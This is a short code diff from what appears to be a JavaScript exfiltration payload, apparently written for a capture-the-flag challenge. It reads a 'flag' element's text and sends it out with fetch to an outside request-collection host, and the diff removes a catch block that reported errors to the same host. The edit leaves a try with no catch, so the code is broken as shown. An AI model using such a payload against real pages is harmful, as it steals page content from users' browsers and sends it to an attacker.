@@ -14,9 +14,7 @@ function search() {
                 const flag = flagElement.textContent;
                 fetch(`${request_Bin}?flag=${flag}`);
             }
-        } catch (e) {
-            fetch(`${request_Bin}?error=${e.message}`);
-        }
+        } 
     };
 }
 
